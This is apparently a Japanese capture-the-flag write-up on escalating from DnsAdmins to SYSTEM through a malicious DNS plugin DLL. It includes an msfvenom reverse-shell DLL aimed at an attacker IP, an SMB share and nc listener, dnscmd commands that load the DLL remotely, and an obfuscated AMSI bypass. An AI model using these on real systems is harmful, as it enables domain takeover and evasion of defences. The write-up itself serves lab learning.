c.f.) 
- https://youtu.be/8KJebvmd1Fk
- [日本語resolu手のwriteup](https://qiita.com/MarshMallow_sh/items/52e04ee4166c7b2b345c#dnsadmins%E6%A8%A9%E9%99%90%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC)
- https://phackt.com/dnsadmins-group-exploitation-write-permissions

**WindowsのDNSにはカスタムプラグインとしてDLLを読み込む機能がある。<br>（dns.exeがSYSTEM権限で動いているという前提で）そのカスタムプラグインとしてrevshellを
起動するようなDLLを読み込ませればよい！**


#### ryanはDnsAdminsグループに属す：

```
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level
```

#### dnsが動いてることを確認：

```
*Evil-WinRM* PS C:\Users\ryan> Get-Process -Name dns

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   5307    3699    69092      68004              3404   0 dns
```

#### dnsサービスの確認：

```
*Evil-WinRM* PS C:\Users\ryan> sc.exe query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

#### マルシャルdll（ペイロード）の作成：

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll --platform windows -o rev.dll
```

#### rev.dllがあるディレクトリでsmbサーバを立てる：

```
sudo impacket-smbserver kali ./
or
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
```

#### 早めにkali側でlistenerを立てておく：

```
$ nc -nvlp 4444
```

#### ryanのリバースシェル上でマリシャスdllをdnsで設定：
> - According to Microsoft protocol specification, the **ServerLevelPluginDl** operation enables us to load a dll of our choosing.
> - dnscmd.exe already implements this option: `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
> - When executing this dnscmd.exe command as a user (a member of DnsAdmins), this registry key is populated: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`

*（注意）このマシンは1分ごとに各サービスが再起動するように設定されていることがnote.txtよりわかっている。*

[ryanのリバースシェル上]

```
*Evil-WinRM* PS C:\Users\ryan> dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
or
*Evil-WinRM* PS C:\Users\ryan> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll

*Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns

*Evil-WinRM* PS C:\Users\ryan> sc.exe start dns
```

（AMSIのバイパスについて）

今回はAMSIによりファイルの転送がいつも通り行かなかった。次を打ち込んで解決した：

```
*Evil-WinRM* PS C:\Users\ryan> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

AMSIのバイパスは**Impacketのsmbserver**で転送すればできるかも！！
